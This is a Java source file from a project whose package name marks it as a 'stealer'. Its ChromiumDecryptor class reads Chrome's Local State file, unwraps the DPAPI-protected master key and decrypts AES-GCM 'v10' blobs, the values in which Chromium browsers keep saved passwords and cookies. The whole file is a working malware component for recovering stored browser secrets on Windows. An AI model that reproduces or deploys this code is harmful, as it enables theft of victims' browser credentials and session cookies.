package com.github.shurpe.stealer.utils.browser;

import com.sun.jna.platform.win32.Crypt32Util;

import org.apache.commons.io.FileUtils;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.GeneralSecurityException;
import java.util.Arrays;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public final class ChromiumDecryptor {

	private static final String DPAPI_PREFIX = "DPAPI";

	public static byte[] getDecryptionKey(final File file) {
		try {
			final String text = FileUtils.readFileToString(file, StandardCharsets.UTF_8);
			final JSONObject json = new JSONObject(text);
			final String key = json.getJSONObject("os_crypt").getString("encrypted_key");
			final byte[] keyBytes = Base64.getDecoder().decode(key);

			if (!new String(keyBytes).startsWith(DPAPI_PREFIX)) {
				return null;
			}

			return Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(keyBytes, DPAPI_PREFIX.length(), keyBytes.length));

		} catch (IOException ignored) {
			return null;
		}
	}

	public static String decrypt(byte[] value, byte[] key) {
		if (value == null || key == null || value.length == 0)
			return "";

		try {
			if (!new String(value).startsWith("v10")) {
				return new String(Crypt32Util.cryptUnprotectData(value));
			} else {
				final byte[] iv = Arrays.copyOfRange(value, 3, 15);
				value = Arrays.copyOfRange(value, 15, value.length);

				return new String(decryptAES(value, key, iv));
			}
		} catch (GeneralSecurityException e) {
			e.printStackTrace();

			return "";
		}
	}

	private static byte[] decryptAES(byte[] inputBytes, byte[] keyBytes, byte[] valueBytes) throws GeneralSecurityException {
		final Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
		final SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
		final GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, valueBytes);

		cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, gcmParameterSpec);

		return cipher.doFinal(inputBytes);
	}
}